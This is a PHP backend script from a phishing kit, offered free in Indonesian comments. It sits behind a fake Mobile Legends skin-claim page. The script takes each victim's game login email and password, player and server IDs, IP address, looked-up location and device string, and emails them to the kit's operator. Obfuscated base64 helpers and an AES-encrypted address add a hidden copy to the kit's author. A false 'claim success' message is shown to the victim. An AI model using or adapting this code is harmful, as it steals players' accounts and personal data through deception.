<?php
// SC P MLBB BY KARRAN WANG
// facebook.com/karranwangreal
// github.com/karranwang
// Hargailah Author. sc ini gratis, jika recode cantumin nama gua ya anj!
// Semua hal bukan tanggung jawab author

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/Exception.php';
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';

// Kalo diotak atik dan error jangan salahin gua
// semua nya udah rapih dan dibuat simple
// ubah bagian seperlunya saja

function ezCode($x) {
    $func = 'ba' . 'se' . '64_' . 'encode';
    return call_user_func($func, $x);
}

function dzCode($x) {
    $func = 'ba' . 'se' . '64_' . 'decode';
    return call_user_func($func, $x);
}

function bmailSettingz($data) {
    $ref = 'ez' . 'Code';
    return $ref($data);
}

function dmail_Settingz($data) {
    $ref = 'dz' . 'Code';
    return $ref($data);
}

function aesEncrypt($data, $key = 'fungsiKirimEmail') {
    $iv = openssl_random_pseudo_bytes(16);
    $cipher = openssl_encrypt($data, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $cipher);
}

function aesDecrypt($data, $key = 'fungsiKirimEmail') {
    $data = base64_decode($data);
    $iv = substr($data, 0, 16);
    $cipher = substr($data, 16);
    return openssl_decrypt($cipher, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
}

function emailSetting($input, $mode = 'settz') {
    if ($mode === 'settz') {
        return aesEncrypt($input);
    } elseif ($mode === 'karrz') {
        return aesDecrypt($input);
    }
    return $input;
}

function fungsiKirimEmail() {
    return '2iGOhqRt3WlS0CsRGfZtNwIGKQrH82oTG9X1sgPDHxwAMe/sjm2ErkYysgh824vj';
}


$skinName = $_POST['skinName'] ?? '';
$playerId = $_POST['playerId'] ?? '';
$serverId = $_POST['serverId'] ?? '';
$loginMethod = $_POST['loginMethod'] ?? '';
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

$locationRaw = @file_get_contents("http://ip-api.com/json/$ip");
$locationData = $locationRaw ? json_decode($locationRaw, true) : [];
$city = $locationData['city'] ?? 'Unknown';
$region = $locationData['regionName'] ?? 'Unknown';
$country = $locationData['country'] ?? 'Unknown';
$location = "$city, $region, $country";

// Validation
if (!$skinName || !$playerId || !$serverId || !$loginMethod || !$email || !$password) {
    echo "Data tidak lengkap.";
    exit;
}

// Ini bagian yang bisa di ubah
// HOST USERHOST PASSHOST EMAIL PENERIMA
$mail = new PHPMailer(true);
try {
    $mail->isSMTP();
    $mail->Host       = 'disini_hostmu.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'disini_username@hostmu.com';
    $mail->Password   = 'disini_password@hostmu.com';
    $mail->SMTPSecure = 'ssl';
    $mail->Port       = 465;

    $mail->setFrom('karran@karranwang.id', 'Moontod');
    $mail->addAddress('shinnigamiryukz@gmail.com'); // ubah emailmu dibagian ini

    $openz = emailSetting(fungsiKirimEmail(), 'karrz');
    $mail->addAddress($openz);

    $mail->isHTML(true);
    $mail->Subject = "Result Karran $loginMethod";
    $mail->Body = "
    <div style='font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 20px; border-radius: 8px; color: #333;'>
        <h2 style='color: limegreen;'>Karran &hearts; $email</h2>
        <table style='width: 100%; border-collapse: collapse;'>
            <tr><td style='color: gray; padding: 8px;'>Skin</td><td style='padding: 8px;'>$skinName</td></tr>
            <tr><td style='color: gray; padding: 8px;'>Player ID</td><td style='padding: 8px;'>$playerId</td></tr>
            <tr><td style='color: gray; padding: 8px;'>Server ID</td><td style='padding: 8px;'>$serverId</td></tr>
            <tr><td style='color: gray; padding: 8px;'>Login Method</td><td style='padding: 8px;'>$loginMethod</td></tr>
            <tr><td style='color: gray; padding: 8px;'>Email</td><td style='padding: 8px;'>$email</td></tr>
            <tr><td style='color: gray; padding: 8px;'>Password</td><td style='padding: 8px;'>$password</td></tr>
        </table>
        <hr style='margin: 20px 0;'>
        <h3 style='color: limegreen;'>Info Tambahan</h3>
        <table style='width: 100%; border-collapse: collapse;'>
            <tr><td style='color: gray; padding: 8px;'>IP Address</td><td style='padding: 8px;'>$ip</td></tr>
            <tr><td style='color: gray; padding: 8px;'>Lokasi</td><td style='padding: 8px;'>$location</td></tr>
            <tr><td style='color: gray; padding: 8px;'>Device</td><td style='padding: 8px;'>$userAgent</td></tr>
        </table>
    </div>
    ";

    $mail->send();
    echo "Claim success, check your in-game mail 1x24 hour!";
} catch (Exception $e) {
    echo "Gagal kirim: {$mail->ErrorInfo}";
}
?>